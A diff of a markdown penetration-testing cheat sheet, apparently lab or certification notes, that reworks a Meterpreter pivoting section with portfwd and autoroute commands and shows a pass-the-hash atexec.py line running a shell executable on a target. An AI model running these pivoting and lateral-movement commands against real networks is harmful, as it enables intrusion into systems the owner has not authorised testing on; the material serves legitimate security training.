@@ -80,7 +80,7 @@ jobs
 netstat -tulnp | grep 9050
 ```
 
-### proxychains — Use with SOCKS
+### proxychains — Use with SOCKS (On Kali)
 
 ```bash
 # /etc/proxychains4.conf (or proxychains.conf):
@@ -425,28 +425,35 @@ atexec.py -hashes :[NTLM_HASH] [USER]@[TARGET_IP] "C:\Temp\shell.exe"
 
 ---
 
-## 🔟 METERPRETER PORT FORWARD ⭐⭐
+## 🔟 METERPRETER PORT FORWARD & ROUTING ⭐⭐
 
 ```bash
-# Inside meterpreter session
-
-# Forward local Kali port → internal target
-portfwd add -l 8080 -p 80 -r 10.10.10.[INTERNAL]
-portfwd add -l 3389 -p 3389 -r 10.10.10.[INTERNAL]
-portfwd add -l 445 -p 445 -r 10.10.10.[INTERNAL]
-
-# List forwards
+# ── portfwd (single port access) ──
+portfwd add -l [LOCAL_PORT] -p [REMOTE_PORT] -r [TARGET_IP]
 portfwd list
-
-# Remove
-portfwd delete -l 8080
+portfwd delete -l [LOCAL_PORT]
 portfwd flush
+
+# Common examples
+portfwd add -l 8080 -p 80   -r 10.10.10.[INTERNAL]
+portfwd add -l 3389 -p 3389 -r 10.10.10.[INTERNAL]
+portfwd add -l 445  -p 445  -r 10.10.10.[INTERNAL]
 
 # After portfwd — connect via localhost on Kali
 nmap -sT -Pn -p 8080 127.0.0.1
 curl http://127.0.0.1:8080
 xfreerdp /u:[USER] /p:[PASS] /v:127.0.0.1:3389
 smbclient //127.0.0.1/share -U [USER]
+
+# ── autoroute (subnet-wide routing through session) ──
+run autoroute -s [SUBNET]/24           # add route
+run autoroute -p                       # print routes
+run autoroute -d -s [SUBNET]/24        # delete route
+
+# OR from msfconsole (session backgrounded)
+route add [SUBNET]/24 [SESSION_ID]
+route print
+route flush
 ```
 
 ---
